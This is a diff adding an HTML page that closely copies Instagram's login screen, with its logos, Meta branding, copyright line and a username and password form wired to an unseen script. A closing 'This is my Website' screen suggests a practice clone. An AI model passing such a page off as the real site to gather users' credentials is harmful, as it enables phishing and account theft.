@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div class="split-container">
+        <!-- Left Pane -->
+        <div class="left-pane">
+            <div class="left-content">
+                <div class="ig-glyph">
+                    <svg aria-label="Instagram" fill="white" height="120" role="img" viewBox="0 0 24 24" width="120">
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.791-4-4s1.791-4 4-4 4 1.791 4 4-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
+                    </svg>
+                </div>
+                <h1 class="headline">See everyday moments from your <br><span class="gradient-text">close
+                        friends.</span></h1>
+
+                <div class="collage-container">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/9nS-W2b-hJ_.png" alt="Collage"
+                        class="collage-img">
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Pane -->
+        <div class="right-pane">
+            <div class="login-wrapper">
+                <h2 class="login-header">Log into Instagram</h2>
+
+                <div id="error-message" class="error-container hidden">
+                    <div class="error-icon-circle">
+                        <svg aria-label="Error" fill="currentColor" height="12" role="img" viewBox="0 0 24 24"
+                            width="12">
+                            <path
+                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
+                            </path>
+                        </svg>
+                    </div>
+                    <span class="error-text">The login information you entered is incorrect. <a href="#"
+                            class="error-link">Find your account and log in.</a></span>
+                </div>
+
+                <form id="login-form" class="ig-form">
+                    <div class="input-container">
+                        <input type="text" id="username" placeholder="Mobile number, username or email" required
+                            autocomplete="username">
+                    </div>
+                    <div class="input-container password-container">
+                        <input type="password" id="password" placeholder="Password" required
+                            autocomplete="current-password" minlength="6">
+                        <button type="button" class="eye-btn" aria-label="Toggle password visibility">
+                            <svg class="eye-icon" fill="#8e8e8e" height="20" viewBox="0 0 24 24" width="20">
+                                <path
+                                    d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
+                            </svg>
+                        </button>
+                    </div>
+                    <button type="submit" class="primary-btn login-btn">Log in</button>
+                    <a href="#" class="link-forgot">Forgot password?</a>
+                </form>
+
+                <div class="divider-section">
+                    <div class="divider-line"></div>
+                </div>
+
+                <div class="alt-actions">
+                    <button class="outline-btn fb-btn">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB"
+                            class="social-icon">
+                        Log in with Facebook
+                    </button>
+                    <button class="outline-btn signup-btn">Create new account</button>
+                </div>
+
+                <div class="meta-footer">
+                    <svg class="meta-svg" viewBox="0 0 1024 1024" width="64" height="64">
+                        <path fill="currentColor"
+                            d="M784.7 447.2l-21.2-12.2c-54.8-31.6-115.5-52.9-178.6-62.8-63.1-9.9-127.3-8.8-190.1 3.2-62.8 12.1-122.9 33.9-178.1 64.9l-21.2 12.2c-41.5 24-73.4 59.3-91 100.8-17.6 41.5-22.1 87-12.8 131s31.8 83 64.2 113c32.4 30 73.1 50.3 117.8 58.7l21.2 4c54.8 10.3 111 8.8 165.1-4.4 54.1-13.2 105.1-37.1 149.9-70.3l17.7-13.2c35.1-26.2 62.1-60.5 78.4-99.7 16.3-39.2 21.6-82 15.3-124-6.3-42-23.7-81.6-50.5-114.8-26.8-33.2-62.5-57.9-103.7-71.5-41.2-13.6-85.3-16.7-128.2-9-42.9 7.7-83.3 25.5-117.3 52l-17.7 13.2c-35.1 26.2-62.1 60.5-78.4 99.7-16.3 39.2-21.6 82-15.3 124 6.3 42 23.7 81.6 50.5 114.8 26.8 33.2 62.5 57.9 103.7 71.5 41.2 13.6 85.3 16.7 128.2 9 42.9-7.7 83.3-25.5 117.3-52l17.7-13.2c35.1-26.2 62.1-60.5 78.4-99.7 16.3-39.2 21.6-82 15.3-124-6.3-42-23.7-81.6-50.5-114.8-26.8-33.2-62.5-57.9-103.7-71.5-41.2-13.6-85.3-16.7-128.2-9-42.9 7.7-83.3 25.5-117.3 52l-17.7 13.2c-35.1 26.2-62.1 60.5-78.4 99.7-16.3 39.2-21.6 82-15.3 124 6.3 42 23.7 81.6 50.5 114.8 26.8 33.2 62.5 57.9 103.7 71.5 41.2 13.6 85.3 16.7 128.2 9 42.9-7.7 83.3-25.5 117.3-52l17.7-13.2c16.2-12.1 29.8-27.1 39.8-44.1 10-17 15.5-36 16.1-55.5.6-19.5-2.8-38.9-10-56.7-7.2-17.8-18.6-33.6-33.3-46.1l-1.8-1.5c-48-40.4-106.6-67.6-169.1-78.6-62.5-11-127.1-9.9-189.1 3.2-62 13.1-120.9 36.9-174.1 70.3l-21.2 13.3c-41.5 26.1-73.4 62.6-91 106.3-17.6 43.7-22.1 91.6-12.8 137.9 9.3 46.3 31.8 87.4 64.2 119.1 32.4 31.7 73.1 53 117.8 61.9l21.2 4.2c54.8 10.9 111.1 9.3 165.1-4.6 54-13.9 104.9-39.1 149.7-74l17.7-13.9c16.2-12.7 29.8-28.5 39.8-46.5 10-18 15.5-37.9 16.1-58.5.6-20.6-2.8-41-10-59.8-7.2-18.8-18.6-35.4-33.3-48.6l-1.8-1.6c-48-42.6-106.6-71.2-169.1-82.8-62.5-11.6-127.1-10.4-189.1 3.4-62 13.8-120.9 38.9-174.1 74l-21.2 14c-41.5 27.5-73.4 65.9-91 112-17.6 46.1-22.1 96.5-12.8 145.3 9.3 48.8 31.8 92.1 64.2 125.5 32.4 33.4 73.1 55.9 117.8 65.2l21.2 4.4c54.8 11.5 111.1 9.8 165.1-4.8 54-14.6 104.9-41.2 149.7-78l17.7-14.7c16.2-13.4 29.8-30 39.8-49 10-19 15.5-40 16.1-61.7.6-21.7-2.8-43.2-10-63-7.2-19.8-18.6-37.3-33.3-51.2l-1.8-1.7zm-297 337.5L466.5 772c-48 10.3-97.9 11.6-146.5 3.9-48.6-7.7-94-24.1-133.2-48.2l-18.9-11.7c-31.5-19.5-56-46.7-70.6-79.1-14.6-32.4-18.7-68-11.9-102.5 6.8-34.5 24.1-66 49.8-90.8 25.7-24.8 58.7-42 95.1-49.6l21.2-4.4c48.6-10.1 99-11.6 148.2-4.5 49.2 7.1 95.9 22.8 136.9 46.2l18.9 10.8c31.5 18 56 43.1 70.6 73.1 14.6 30 18.7 62.9 11.9 94.8-6.8 31.9-24.1 61-49.8 83.9-25.7 22.9-58.7 38.8-95.1 45.8l-21.2 4.1c-13.3 2.6-26.8 4-40.4 4.2h-1c-22.6 0-45-4.1-66.2-12.1z" />
+                    </svg>
+                    <span class="meta-label">Meta</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="main-footer">
+        <div class="footer-row">
+            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a
+                href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a
+                href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a
+                href="#">Meta Verified</a>
+        </div>
+        <div class="footer-row copyright">
+            <span>English</span>
+            <span>© 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <div id="success-screen" class="success-screen hidden">
+        <div class="success-content">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" class="check-svg">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+            <h1 class="success-msg">This is my Website <br><span>Aage Abhi Kam Baki He</span></h1>
+            <button id="signout-btn" class="signout-btn">Sign Out</button>
+            <div class="glow-effect"></div>
+        </div>
+    </div>
+
+    <script type="module" src="main.js"></script>
+</body>
+
+</html>
